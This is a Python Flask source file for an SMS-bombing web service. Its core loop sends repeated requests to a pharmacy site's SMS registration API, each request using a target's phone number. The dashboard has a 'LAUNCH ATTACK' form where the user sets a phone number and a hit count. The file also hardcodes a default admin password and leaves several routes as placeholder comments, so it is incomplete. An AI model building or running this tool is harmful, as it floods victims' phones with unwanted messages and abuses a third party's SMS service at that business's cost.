import requests, threading, os, time, sqlite3, random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32))

# ---------- [AUTO WAKEUP SYSTEM] ----------
RENDER_URL = "https://rk-bomb.onrender.com"

def wake_up():
    while True:
        try:
            requests.get(RENDER_URL, timeout=10)
            print(f"[{datetime.now()}] Ping sent to keep server alive.")
        except:
            print("Ping failed.")
        time.sleep(600) # 10 Minutes

threading.Thread(target=wake_up, daemon=True).start()

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
DB_PATH = 'rk_v24_premium.db'

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        # Default Admin
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
        except: pass

init_db()

# ---------- [CORE ENGINE] ----------
active_sessions = {}

def send_request(phone):
    # আপনার গিটহাবের এপিআই লিঙ্কটি এখানে যোগ করুন
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                time.sleep(0.5) # Anti-spam delay
            else: time.sleep(1)

    # Save to history
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], get_bd_time().strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [UI & ROUTES] ----------
# আপনার দেওয়া LAYOUT এবং ROUTES এখানে একইভাবে থাকবে...
# (জাভাস্ক্রিপ্ট এবং সিএসএস আগের মতোই থাকবে)

# ... [বাকি সব রাউট আগের মতোই থাকবে] ...

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    # আপনার দেওয়া HTML ড্যাশবোর্ড কোড
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">🚀 MISSION CONTROL</h3><form action="/api/start"><input name="num" type="tel" inputmode="numeric" placeholder="Phone Number" required><input name="amt" type="number" placeholder="Hit Amount" required><button class="btn-turbo">LAUNCH ATTACK</button></form></div></div><div id="live-engine"></div>'))

# [অন্যান্য রাউট যেমন: /api/start, /api/status, /history সব আগের মতোই কাজ করবে]

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 54300))
    app.run(host='0.0.0.0', port=port)
